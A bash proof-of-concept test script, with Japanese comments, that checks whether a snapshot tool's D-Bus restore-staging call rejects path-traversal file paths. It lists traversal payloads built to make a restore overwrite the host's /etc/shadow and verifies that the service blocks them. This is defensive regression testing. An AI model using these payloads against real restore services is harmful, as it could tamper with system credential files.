#!/bin/bash
#
# @file poc_restore_traversal.sh
# @brief Issue #5a: StageRestoreEntriesの復元パストラバーサルPoC
#
# 警告: 本PoCは/etc/shadowのmtime/inodeを変化させる可能性がある
# VM限定で実行する
#
# シナリオ:
#   filePathsに/.snapshots/N/snapshot/../../../etc/shadowなどを渡し、
#   snapshot内のファイルではなくホストルートの/etc/shadowを書き換えさせられるかを試みる
#   段階的復元ではStageRestoreEntriesが.と..成分、相対パス、/.snapshots配下
#   (正規化後の先頭成分で判定)をInvalidArgsで拒否する
#
# 使い方 : poc_restore_traversal.sh            (fixedモード)
#          BASELINE=1 poc_restore_traversal.sh (baselineモード)
# 終了コード : 0 = 期待どおり、1 = 想定外、2 = 環境エラー
#

set -u    # 未定義変数の参照をエラーにする
SCRIPT_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"    # 本スクリプトのあるディレクトリ
source "$SCRIPT_DIR/common.sh"

assert_running_in_vm
assert_qsnapper_service

SNAP_ID=$(ensure_snapshot root)
log "Using snapshot ID=$SNAP_ID"

# 改ざん検出のため事前状態を記録する
BEFORE=$(stat -c '%Y %i %s' /etc/shadow)
log "Before: /etc/shadow stat = $BEFORE"

# 悪性filePath候補 (StageRestoreEntriesはconfig相対名を受け取る)
# /etc/shadowはroot configでは正当な名前なので含めない (commit時に権威ある比較結果との照合で弾かれる)
PAYLOADS=(
    "/.snapshots/$SNAP_ID/snapshot/../../../etc/shadow"
    "etc/shadow"
    "/.snapshots/$SNAP_ID/snapshot/etc/../../../etc/shadow"
    "//.snapshots/$SNAP_ID/snapshot/etc/shadow"
    "/etc/../etc/shadow"
)

# 認証済みadminで叩く必要がある (aliceを使う)
ALICE="${ALICE_USER:-alice}"

# legacyのRestoreFiles / RestoreFilesDirectは廃止済み
# 計画はD-Bus接続 (unique name) に束縛されるため、BeginとStageを同じ接続で呼ぶ必要があり、dbus-sendではなくpython3-dbusを使う
reproduced=0    # 脆弱性を再現したら1にする
for mode in yast direct; do    # yast/directの両モードで試す
    for payload in "${PAYLOADS[@]}"; do
        log "Testing mode=$mode filePath=$payload"
        OUTPUT=$(sudo -u "$ALICE" python3 - "$SNAP_ID" "$mode" "$payload" 2>&1 <<'PYEOF' || true
import sys
from dbus import SystemBus, Interface
from dbus.exceptions import DBusException

snap_id, mode, payload = int(sys.argv[1]), sys.argv[2], sys.argv[3]
ops = Interface(SystemBus().get_object("com.presire.qsnapper.Operations",
                                       "/com/presire/qsnapper/Operations"),
                "com.presire.qsnapper.Operations")
manifest_id = ops.BeginRestorePlan("root", snap_id, 0, mode)
try:
    ops.StageRestoreEntries(manifest_id, [payload], ["modified"])
    print("STAGED")
except DBusException as e:
    print(f"Error {e.get_dbus_name()}: {e.get_dbus_message()}")
finally:
    try:
        ops.CancelRestorePlan(manifest_id)
    except DBusException:
        pass
PYEOF
)

        if echo "$OUTPUT" | grep -qE "Error.*InvalidArgs"; then
            log "  → blocked"
        else
            log "  → WARNING: no validation error, call returned: $(echo "$OUTPUT" | head -1)"
            reproduced=1
        fi
    done
done

AFTER=$(stat -c '%Y %i %s' /etc/shadow)
log "After : /etc/shadow stat = $AFTER"
if [[ "$BEFORE" != "$AFTER" ]]; then
    log "CRITICAL: /etc/shadow was modified!"
    reproduced=1
fi

(( reproduced )) && report_result reproduced || report_result blocked
